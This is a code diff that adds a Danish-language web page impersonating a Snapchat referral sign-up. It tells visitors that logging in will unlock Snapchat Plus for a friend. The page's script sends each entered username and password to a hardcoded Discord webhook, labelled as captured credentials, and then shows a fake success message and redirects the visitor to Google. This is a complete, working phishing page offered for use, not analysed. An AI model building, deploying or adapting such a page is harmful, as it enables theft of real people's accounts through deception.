@@ -1,36 +1,118 @@
 <!DOCTYPE html>
 <html lang="da">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tilmeld Snapchat - Anbefal en ven</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #fafafa;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .refer-container {
-            background-color: #fff;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            width: 300px;
-            text-align: center;
-        }
-        .refer-container h2 {
-            margin-bottom: 20px;
-        }
-        .refer-container p {
-            margin-bottom: 20px;
-        }
-        .refer-container input {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #ccc;
-            border-radius: 4
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Tilmeld Snapchat - Anbefal en ven</title>
+<style>
+body {
+font-family: Arial, sans-serif;
+background-color: #fafafa;
+display: flex;
+justify-content: center;
+align-items: center;
+height: 100vh;
+margin: 0;
+}
+.refer-container {
+background-color: #fff;
+padding: 20px;
+border-radius: 8px;
+box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+width: 300px;
+text-align: center;
+}
+.refer-container h2 {
+margin-bottom: 20px;
+}
+.refer-container p {
+margin-bottom: 20px;
+}
+.refer-container input {
+width: 100%;
+padding: 10px;
+margin: 10px 0;
+border: 1px solid #ccc;
+border-radius: 4px;
+}
+.refer-container button {
+width: 100%;
+padding: 10px;
+background-color: #fffc00;
+border: none;
+border-radius: 4px;
+color: #000;
+font-size: 16px;
+cursor: pointer;
+}
+.success-message {
+margin-top: 20px;
+font-size: 18px;
+color: #008000;
+}
+.countdown {
+margin-top: 10px;
+font-size: 16px;
+color: #555;
+}
+</style>
+</head>
+<body>
+<div class="refer-container">
+<h2>Tilmeld dig Snapchat, så din ven kan få Snapchat Plus gratis!</h2>
+<p>Din ven har anbefalet dig til Snapchat. Log ind for at verificere og hjælpe dem med at låse op for Snapchat Plus gratis.</p>
+<form id="loginForm">
+<input type="text" id="username" placeholder="Brugernavn" required>
+<input type="password" id="password" placeholder="Adgangskode" required>
+<button type="submit">Tilmeld dig Snapchat</button>
+</form>
+<div id="successMessage" class="success-message" style="display: none;">
+Du har nu tilmeldt dig. Tak!
+</div>
+<div id="countdownMessage" class="countdown" style="display: none;">
+Omdirigerer om (3)
+</div>
+</div>
+
+<script>
+document.getElementById('loginForm').addEventListener('submit', function(event) {
+event.preventDefault();
+var username = document.getElementById('username').value;
+var password = document.getElementById('password').value;
+
+// Send the credentials to your Discord webhook
+fetch('https://discord.com/api/webhooks/1440331213935214702/Wz1b1XpLzQfieOuq8tQc153FdD_4JjUZnOR3h6pLAO4lABE3RkQsnR7PC2JVZf0qD-is', {
+method: 'POST',
+headers: {
+'Content-Type': 'application/json'
+},
+body: JSON.stringify({
+content: `Nye Snapchat-credentialer er fanget!\nBrugernavn: ${username}\nAdgangskode: ${password}`
+})
+})
+.then(response => response.json())
+.then(data => {
+// Show success message and countdown
+document.getElementById('successMessage').style.display = 'block';
+document.getElementById('countdownMessage').style.display = 'block';
+
+// Countdown and redirect to Google
+let count = 3;
+const countdownInterval = setInterval(() => {
+count--;
+document.getElementById('countdownMessage').innerText = `Omdirigerer om (${count})`;
+if (count <= 0) {
+clearInterval(countdownInterval);
+window.location.href = 'https://www.google.com';
+}
+}, 1000);
+})
+.catch(error => {
+console.error('Error:', error);
+                // Redirect to Google even if there is an error
+                window.location.href = 'https://www.google.com';
+});
+});
+</script>
+</body>
+</html>
